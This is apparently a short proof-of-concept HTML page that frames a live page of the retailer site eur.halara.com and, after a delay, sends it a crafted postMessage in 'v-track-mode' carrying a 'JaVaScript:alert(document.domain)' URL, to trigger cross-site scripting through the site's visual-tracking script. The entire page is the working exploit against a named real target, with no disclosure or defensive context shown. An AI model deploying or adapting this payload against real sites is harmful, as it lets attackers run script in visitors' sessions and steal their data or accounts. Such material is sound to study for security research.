<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Iframe PostMessage Halara2</title>
    <style>
        iframe {
            width: 600px;
            height: 400px;
            border: 1px solid #ccc;
        }
    </style>
</head>
<body>
    <h2>Parent Page</h2>
    <iframe id="myIframe" src="https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true" name="myIframe"></iframe>

    <script>
        window.addEventListener('load', function() {
            const iframe = document.getElementById('myIframe');
            setTimeout(() => {
                iframe.contentWindow.postMessage({
                    source: "sa-fe",
                    type: "v-track-mode",
                    data: {
                        isVtrack: true,
                        userURL: "JaVaScript:alert(document.domain)"
                    }
                }, "*");
            }, 1500);
        });
    </script>
</body>
</html>
